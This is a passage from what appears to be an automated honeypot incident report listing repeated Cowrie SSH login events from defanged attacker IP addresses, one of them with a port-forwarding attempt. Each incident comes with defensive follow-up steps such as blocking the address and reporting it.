| `2026-07-13 11:24:10` | `cowrie.session.connect` |
| `2026-07-13 11:24:10` | `cowrie.login.success` |
| `2026-07-13 11:24:11` | `cowrie.session.params` |
| `2026-07-13 11:24:11` | `cowrie.log.closed` |
| `2026-07-13 11:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c41d14e9e6

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:11` | `cowrie.session.connect` |
| `2026-07-13 11:24:11` | `cowrie.login.success` |
| `2026-07-13 11:24:12` | `cowrie.session.params` |
| `2026-07-13 11:24:12` | `cowrie.log.closed` |
| `2026-07-13 11:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-308cfff5bd67

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:12` | `cowrie.session.connect` |
| `2026-07-13 11:24:12` | `cowrie.login.success` |
| `2026-07-13 11:24:13` | `cowrie.session.params` |
| `2026-07-13 11:24:13` | `cowrie.log.closed` |
| `2026-07-13 11:24:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bd846d5d02

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:13` | `cowrie.session.connect` |
| `2026-07-13 11:24:13` | `cowrie.login.success` |
| `2026-07-13 11:24:14` | `cowrie.session.params` |
| `2026-07-13 11:24:14` | `cowrie.log.closed` |
| `2026-07-13 11:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cec0b949967

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:14` | `cowrie.session.connect` |
| `2026-07-13 11:24:14` | `cowrie.login.success` |
| `2026-07-13 11:24:14` | `cowrie.session.params` |
| `2026-07-13 11:24:14` | `cowrie.log.closed` |
| `2026-07-13 11:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be89b852574

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:14` | `cowrie.session.connect` |
| `2026-07-13 11:24:15` | `cowrie.login.success` |
| `2026-07-13 11:24:15` | `cowrie.session.params` |
| `2026-07-13 11:24:15` | `cowrie.log.closed` |
| `2026-07-13 11:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c19cebbe0d

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:15` | `cowrie.session.connect` |
| `2026-07-13 11:24:15` | `cowrie.login.success` |
| `2026-07-13 11:24:16` | `cowrie.session.params` |
| `2026-07-13 11:24:16` | `cowrie.log.closed` |
| `2026-07-13 11:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b424384849

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:16` | `cowrie.session.connect` |
| `2026-07-13 11:24:16` | `cowrie.login.success` |
| `2026-07-13 11:24:17` | `cowrie.session.params` |
| `2026-07-13 11:24:17` | `cowrie.log.closed` |
| `2026-07-13 11:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1acaefe52e44

| Field | Detail |
|---|---|
| **Source IP** | `85.19.195[.]12` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:16` | `cowrie.session.connect` |
| `2026-07-13 11:24:17` | `cowrie.client.version` |
| `2026-07-13 11:24:17` | `cowrie.client.kex` |
| `2026-07-13 11:24:19` | `cowrie.login.success` |
| `2026-07-13 11:24:20` | `cowrie.direct-tcpip.request` |
| `2026-07-13 11:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.19.195[.]12` to AbuseIPDB if not already reported
- [ ] Block `85.19.195[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eef152861bfa

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:17` | `cowrie.session.connect` |
| `2026-07-13 11:24:17` | `cowrie.login.success` |
| `2026-07-13 11:24:17` | `cowrie.session.params` |
| `2026-07-13 11:24:17` | `cowrie.log.closed` |
| `2026-07-13 11:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bdd3d661190

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:17` | `cowrie.session.connect` |
| `2026-07-13 11:24:18` | `cowrie.login.success` |
| `2026-07-13 11:24:18` | `cowrie.session.params` |
| `2026-07-13 11:24:18` | `cowrie.log.closed` |
| `2026-07-13 11:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c64c4f20e62

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:18` | `cowrie.session.connect` |
| `2026-07-13 11:24:18` | `cowrie.login.success` |
| `2026-07-13 11:24:19` | `cowrie.session.params` |
| `2026-07-13 11:24:19` | `cowrie.log.closed` |
| `2026-07-13 11:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bceb42a12353

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:19` | `cowrie.session.connect` |
| `2026-07-13 11:24:19` | `cowrie.login.success` |
| `2026-07-13 11:24:20` | `cowrie.session.params` |
| `2026-07-13 11:24:20` | `cowrie.log.closed` |
| `2026-07-13 11:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58a0a576971

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:20` | `cowrie.session.connect` |
| `2026-07-13 11:24:20` | `cowrie.login.success` |
| `2026-07-13 11:24:21` | `cowrie.session.params` |
| `2026-07-13 11:24:21` | `cowrie.log.closed` |
| `2026-07-13 11:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e7c735bab4c

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:21` | `cowrie.session.connect` |
| `2026-07-13 11:24:21` | `cowrie.login.success` |
| `2026-07-13 11:24:21` | `cowrie.session.params` |
| `2026-07-13 11:24:21` | `cowrie.log.closed` |
| `2026-07-13 11:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149514b7889e

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:21` | `cowrie.session.connect` |
| `2026-07-13 11:24:22` | `cowrie.login.success` |
| `2026-07-13 11:24:22` | `cowrie.session.params` |
| `2026-07-13 11:24:22` | `cowrie.log.closed` |
| `2026-07-13 11:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705c5e9e15f2

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:22` | `cowrie.session.connect` |
| `2026-07-13 11:24:22` | `cowrie.login.success` |
| `2026-07-13 11:24:23` | `cowrie.session.params` |
| `2026-07-13 11:24:23` | `cowrie.log.closed` |
| `2026-07-13 11:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348701597744

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:23` | `cowrie.session.connect` |
| `2026-07-13 11:24:23` | `cowrie.login.success` |
| `2026-07-13 11:24:24` | `cowrie.session.params` |
| `2026-07-13 11:24:24` | `cowrie.log.closed` |
| `2026-07-13 11:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d7b4b8cdad4

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:24` | `cowrie.session.connect` |
| `2026-07-13 11:24:24` | `cowrie.login.success` |
| `2026-07-13 11:24:24` | `cowrie.session.params` |
| `2026-07-13 11:24:25` | `cowrie.log.closed` |
| `2026-07-13 11:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0f860ec44f

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:25` | `cowrie.session.connect` |
| `2026-07-13 11:24:25` | `cowrie.login.success` |
| `2026-07-13 11:24:25` | `cowrie.session.params` |
| `2026-07-13 11:24:25` | `cowrie.log.closed` |
| `2026-07-13 11:24:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271e30137365

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:25` | `cowrie.session.connect` |
| `2026-07-13 11:24:26` | `cowrie.login.success` |
| `2026-07-13 11:24:26` | `cowrie.session.params` |
| `2026-07-13 11:24:26` | `cowrie.log.closed` |
| `2026-07-13 11:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46bc0bd8eb1b

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:26` | `cowrie.session.connect` |
| `2026-07-13 11:24:26` | `cowrie.login.success` |
| `2026-07-13 11:24:27` | `cowrie.session.params` |
| `2026-07-13 11:24:27` | `cowrie.log.closed` |
| `2026-07-13 11:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f762d9c0807

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:27` | `cowrie.session.connect` |
| `2026-07-13 11:24:27` | `cowrie.login.success` |
| `2026-07-13 11:24:28` | `cowrie.session.params` |
| `2026-07-13 11:24:28` | `cowrie.log.closed` |
| `2026-07-13 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66a7f209b39

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:28` | `cowrie.session.connect` |
| `2026-07-13 11:24:28` | `cowrie.login.success` |
| `2026-07-13 11:24:28` | `cowrie.session.params` |
| `2026-07-13 11:24:28` | `cowrie.log.closed` |
| `2026-07-13 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fedca988a1

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:28` | `cowrie.session.connect` |
| `2026-07-13 11:24:29` | `cowrie.login.success` |
| `2026-07-13 11:24:29` | `cowrie.session.params` |
| `2026-07-13 11:24:29` | `cowrie.log.closed` |
| `2026-07-13 11:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8c43793f96

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:29` | `cowrie.session.connect` |
| `2026-07-13 11:24:29` | `cowrie.login.success` |
| `2026-07-13 11:24:30` | `cowrie.session.params` |
| `2026-07-13 11:24:30` | `cowrie.log.closed` |
| `2026-07-13 11:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3dff6eeec05

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:30` | `cowrie.session.connect` |
| `2026-07-13 11:24:30` | `cowrie.login.success` |
| `2026-07-13 11:24:31` | `cowrie.session.params` |
| `2026-07-13 11:24:31` | `cowrie.log.closed` |
| `2026-07-13 11:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7b43904efa

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:31` | `cowrie.session.connect` |
| `2026-07-13 11:24:31` | `cowrie.login.success` |
| `2026-07-13 11:24:31` | `cowrie.session.params` |
| `2026-07-13 11:24:31` | `cowrie.log.closed` |
| `2026-07-13 11:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53a7761ac7b

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:32` | `cowrie.session.connect` |
| `2026-07-13 11:24:32` | `cowrie.login.success` |
| `2026-07-13 11:24:32` | `cowrie.session.params` |
| `2026-07-13 11:24:32` | `cowrie.log.closed` |
| `2026-07-13 11:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d872057696

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:32` | `cowrie.session.connect` |
| `2026-07-13 11:24:32` | `cowrie.login.success` |
| `2026-07-13 11:24:33` | `cowrie.session.params` |
| `2026-07-13 11:24:33` | `cowrie.log.closed` |
| `2026-07-13 11:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-376fb8a9822f

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:33` | `cowrie.session.connect` |
| `2026-07-13 11:24:33` | `cowrie.login.success` |
| `2026-07-13 11:24:34` | `cowrie.session.params` |
| `2026-07-13 11:24:34` | `cowrie.log.closed` |
| `2026-07-13 11:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa1550aadc3e

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:34` | `cowrie.session.connect` |
| `2026-07-13 11:24:34` | `cowrie.login.success` |
| `2026-07-13 11:24:34` | `cowrie.session.params` |
| `2026-07-13 11:24:34` | `cowrie.log.closed` |
| `2026-07-13 11:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df69a356f36

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:34` | `cowrie.session.connect` |
| `2026-07-13 11:24:35` | `cowrie.login.success` |
| `2026-07-13 11:24:35` | `cowrie.session.params` |
| `2026-07-13 11:24:35` | `cowrie.log.closed` |
| `2026-07-13 11:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]125` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fa032c581c

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]125` |
| **First Seen** | 2026-07-13 11:24 |
| **Last Seen** | 2026-07-13 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 11:24:35` | `cowrie.session.connect` |
